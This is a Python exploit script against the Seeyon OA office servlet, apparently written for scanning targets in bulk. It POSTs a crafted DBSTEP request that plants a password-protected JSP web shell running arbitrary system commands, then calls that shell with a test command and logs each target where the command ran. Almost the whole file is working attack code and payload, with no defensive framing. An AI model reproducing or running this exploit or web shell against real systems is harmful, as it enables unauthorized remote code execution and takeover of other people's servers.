# -*- coding:utf-8 -*-
# author:f0ngf0ng
import threading
import time
import requests
from queue import Queue
import base64

total = 0
event = threading.Event()
event.set()
q = Queue(-1)
s = time.strftime('%Y-%m-%d',time.localtime(time.time()))

exitFlag = 0


url = "xx"

headers = {
	'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
	'Content-Type': 'application/x-www-form-urlencoded'
}

payload = '''
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce'''

try:
	requests.packages.urllib3.disable_warnings()
	a = requests.post(url + "/seeyon/htmlofficeservlet", headers=headers, data=payload, timeout=3)
	print(a.status_code)
	if a.status_code == 200:
		print("123")
		b = requests.get(url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd /c echo f0ng")
		if "f0ng" in b.text:
			with open("tttet.txt", "a+") as f:
				print(url)
				f.writelines(url )
except requests.exceptions.ConnectTimeout:
	# NETWORK_STATUS = False
	print("o")

except requests.exceptions.Timeout:
	# REQUEST_TIMEOUT = True
	print("o")

except requests.exceptions.ConnectionError:
	print("o")

finally:
	print("OK")


